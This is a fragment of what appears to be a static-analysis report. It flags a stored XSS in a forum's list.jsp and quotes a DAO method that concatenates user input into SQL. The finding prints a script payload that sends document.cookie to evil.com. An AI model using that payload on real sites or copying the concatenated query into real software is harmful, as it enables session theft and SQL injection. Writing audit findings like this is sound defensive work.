          "level": "error",
          "message": {
            "text": "The EL expression ${msg.subject} on line 19 of list.jsp writes the message subject directly into an <h4> element without HTML encoding. The subject is stored in the database via MessageDAO.post(), which concatenates unvalidated user input directly into an INSERT SQL statement:\n\njdbcTemplate.execute(\"INSERT INTO messages(author, subject, body, timestamp) VALUES ('\"\n    + author + \"', '\" + subject + \"', '\" + body + \"', NOW())\");\n\nAn attacker who submits a message with a subject like:\n<script>fetch('https://evil.com/?c='+document.cookie)</script>\n\nwill have that payload rendered unescaped in every visitor's browser when they navigate to the message list. Because the payload persists in the database and is served to every user who loads the list, this is a persistent (stored) XSS vulnerability affecting all forum users.",
            "markdown": "The EL expression `${msg.subject}` on line 19 of `list.jsp` writes the message subject directly into an `<h4>` element without HTML encoding. The subject is stored in the database via `MessageDAO.post()`, which concatenates unvalidated user input directly into an `INSERT` SQL statement:\n\n```java\njdbcTemplate.execute(\"INSERT INTO messages(author, subject, body, timestamp) VALUES ('\"\n    + author + \"', '\" + subject + \"', '\" + body + \"', NOW())\");\n```\n\nAn attacker who submits a message with a subject like:\n```\n<script>fetch('https://evil.com/?c='+document.cookie)</script>\n```\nwill have that payload rendered unescaped in every visitor's browser when they navigate to the message list. Because the payload persists in the database and is served to **every** user who loads the list, this is a persistent (stored) XSS vulnerability affecting all forum users."
